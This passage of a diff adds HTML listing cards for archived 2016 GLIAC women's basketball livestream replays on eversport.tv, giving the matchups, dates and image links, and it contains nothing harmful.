+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/12/17/walsh-at-lake-superior-state">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac_wvb_lssu_hero_17.jpg?itok=MGj9lAMG" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac_wvb_lssu_hero_17.jpg?itok=6Wn2RcPu" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac_wvb_lssu_hero_17.jpg?itok=3mRqnmgS" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac_wvb_lssu_hero_17.jpg?itok=VS6bDcrT" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Walsh at Lake Superior State livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Walsh<span class="vs"> at </span>Lake Superior State</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-12-17T18:00:00+00:00" data-format="d M H:i T">17 Dec 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Walsh at Lake Superior State" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-13 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/12/15/findlay-at-northern-michigan-0">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_48.jpg?itok=--HvLQ_z" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/2016-northern-michigan-generic-hero_48.jpg?itok=x701sb0s" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/2016-northern-michigan-generic-hero_48.jpg?itok=kNB2Z9s6" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/2016-northern-michigan-generic-hero_48.jpg?itok=AeEmrAt0" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Findlay at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Findlay<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-12-15T23:00:00+00:00" data-format="d M H:i T">15 Dec 23:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Findlay at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-14 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/12/15/lake-erie-at-lake-superior-state">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac_wvb_lssu_hero_16.jpg?itok=VM8myudq" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac_wvb_lssu_hero_16.jpg?itok=2-NPXNa4" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac_wvb_lssu_hero_16.jpg?itok=bHR36LMQ" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac_wvb_lssu_hero_16.jpg?itok=-aznJmyo" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Lake Erie at Lake Superior State livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Lake Erie<span class="vs"> at </span>Lake Superior State</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-12-15T22:30:00+00:00" data-format="d M H:i T">15 Dec 22:30 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Lake Erie at Lake Superior State" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-15 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/12/3/tiffin-at-lake-superior-state">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac_wvb_lssu_hero_13.jpg?itok=SnuAHVIX" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac_wvb_lssu_hero_13.jpg?itok=HR_gC4Uv" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac_wvb_lssu_hero_13.jpg?itok=1EAkUHvR" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac_wvb_lssu_hero_13.jpg?itok=04rosJG5" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Tiffin at Lake Superior State livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Tiffin<span class="vs"> at </span>Lake Superior State</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-12-03T18:00:00+00:00" data-format="d M H:i T">03 Dec 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Tiffin at Lake Superior State" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-16 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/12/1/walsh-at-northern-michigan-0">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_47.jpg?itok=0-WDfjHv" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/2016-northern-michigan-generic-hero_47.jpg?itok=opGwBjxs" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/2016-northern-michigan-generic-hero_47.jpg?itok=RPYzqqvf" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/2016-northern-michigan-generic-hero_47.jpg?itok=SjJdDpxj" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Walsh at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Walsh<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-12-01T23:00:00+00:00" data-format="d M H:i T">01 Dec 23:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Walsh at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-17 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/12/1/ashland-at-lake-superior-state">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac_wvb_lssu_hero_12.jpg?itok=TwwB1bBv" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac_wvb_lssu_hero_12.jpg?itok=86jVo5ZH" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac_wvb_lssu_hero_12.jpg?itok=6jfEIYYV" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac_wvb_lssu_hero_12.jpg?itok=3i630D_K" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Ashland at Lake Superior State livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Ashland<span class="vs"> at </span>Lake Superior State</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-12-01T22:30:00+00:00" data-format="d M H:i T">01 Dec 22:30 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Ashland at Lake Superior State" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-18 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/11/22/minnesota-duluth-at-northern-michigan-0">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_46.jpg?itok=r9GYkqed" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/2016-northern-michigan-generic-hero_46.jpg?itok=rj3_RNYV" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/2016-northern-michigan-generic-hero_46.jpg?itok=nislTTDF" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/2016-northern-michigan-generic-hero_46.jpg?itok=OEXP9Uh6" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Minnesota Duluth at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Minnesota Duluth<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-11-22T23:00:00+00:00" data-format="d M H:i T">22 Nov 23:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Minnesota Duluth at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-19 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/11/19/minnesota-crookston-at-northern-michigan-0">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_45.jpg?itok=NdtgVGam" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/2016-northern-michigan-generic-hero_45.jpg?itok=cIMPERfC" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/2016-northern-michigan-generic-hero_45.jpg?itok=YifHgAiz" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/2016-northern-michigan-generic-hero_45.jpg?itok=yeDbHXC9" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Minnesota-Crookston at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Minnesota-Crookston<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-11-19T18:00:00+00:00" data-format="d M H:i T">19 Nov 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Minnesota-Crookston at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-20 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/11/18/concordia-st-paul-at-northern-michigan-0">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/2016-northern-michigan-generic-hero_58.jpg?itok=SlyxRCEr" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/2016-northern-michigan-generic-hero_58.jpg?itok=Hxsa0ce8" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/2016-northern-michigan-generic-hero_58.jpg?itok=i82MFnwa" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/2016-northern-michigan-generic-hero_58.jpg?itok=LclRqXCJ" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Concordia-St. Paul at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Concordia-St. Paul<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-11-18T23:00:00+00:00" data-format="d M H:i T">18 Nov 23:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Concordia-St. Paul at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-21 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/11/15/grace-bible-at-lake-superior-state-0">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac_wvb_lssu_hero_26.jpg?itok=UIFYFiyD" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac_wvb_lssu_hero_26.jpg?itok=XSFOOJ9j" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac_wvb_lssu_hero_26.jpg?itok=2NWbIfuO" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac_wvb_lssu_hero_26.jpg?itok=8iFbGxyU" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Grace Bible at Lake Superior State livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Grace Bible<span class="vs"> at </span>Lake Superior State</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-11-15T18:00:00+00:00" data-format="d M H:i T">15 Nov 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Grace Bible at Lake Superior State" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-22 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/2/20/northwood-at-northern-michigan">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac-womensbasketball-nmu-hero_9.jpg?itok=pCOh8TFS" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac-womensbasketball-nmu-hero_9.jpg?itok=lMtXQzt6" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac-womensbasketball-nmu-hero_9.jpg?itok=0i5wz1HL" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac-womensbasketball-nmu-hero_9.jpg?itok=kWq4hALA" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt=" Northwood at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams"> Northwood<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-02-20T16:00:00+00:00" data-format="d M H:i T">20 Feb 16:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content=" Northwood at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-23 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/2/18/lake-at-northern-michigan">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac-womensbasketball-nmu-hero_8.jpg?itok=otqGZxHD" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac-womensbasketball-nmu-hero_8.jpg?itok=qRvUI0tW" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac-womensbasketball-nmu-hero_8.jpg?itok=4rJCi4CK" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac-womensbasketball-nmu-hero_8.jpg?itok=eEBhYhGV" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Lake at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Lake<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-02-18T23:00:00+00:00" data-format="d M H:i T">18 Feb 23:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Lake at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-24 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/2/6/hillsdale-at-lake-superior">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac-womensbasketball-lssu-hero_10.jpg?itok=Jv8QDR2a" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac-womensbasketball-lssu-hero_10.jpg?itok=1i9Ca92j" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac-womensbasketball-lssu-hero_10.jpg?itok=uBITAcAM" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac-womensbasketball-lssu-hero_10.jpg?itok=T88Tdj3t" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Hillsdale at Lake Superior livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Lake Superior<span class="vs"> vs. </span></h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-02-06T18:00:00+00:00" data-format="d M H:i T">06 Feb 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Hillsdale at Lake Superior" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-25 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/2/4/grand-valley-state-at-northern-michigan">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac-womensbasketball-nmu-hero_6.jpg?itok=--SjuRnJ" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac-womensbasketball-nmu-hero_6.jpg?itok=xWTP_pdX" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac-womensbasketball-nmu-hero_6.jpg?itok=ElhIddtu" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac-womensbasketball-nmu-hero_6.jpg?itok=c968RLHu" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Grand Valley State at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Grand Valley State<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-02-04T23:00:00+00:00" data-format="d M H:i T">04 Feb 23:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Grand Valley State at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-26 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/2/4/saginaw-valley-state-at-lake-superior">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac-womensbasketball-lssu-hero_9.jpg?itok=cYA4sa8k" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac-womensbasketball-lssu-hero_9.jpg?itok=czHEcD7r" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac-womensbasketball-lssu-hero_9.jpg?itok=IW3MY2Ia" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac-womensbasketball-lssu-hero_9.jpg?itok=usKRLjdl" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Saginaw Valley State at Lake Superior livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Saginaw Valley State<span class="vs"> at </span>Lake Superior</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-02-04T22:30:00+00:00" data-format="d M H:i T">04 Feb 22:30 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Saginaw Valley State at Lake Superior" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-27 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/2/1/michigan-tech-at-northern-michigan">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac-womensbasketball-nmu-hero_5.jpg?itok=bs3Vc36C" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac-womensbasketball-nmu-hero_5.jpg?itok=usKZHXyo" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac-womensbasketball-nmu-hero_5.jpg?itok=iBpKTfiS" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac-womensbasketball-nmu-hero_5.jpg?itok=aRr_gDEr" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt=" Michigan Tech at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams"> Michigan Tech<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-02-01T23:00:00+00:00" data-format="d M H:i T">01 Feb 23:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content=" Michigan Tech at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-28 views-row-even" >
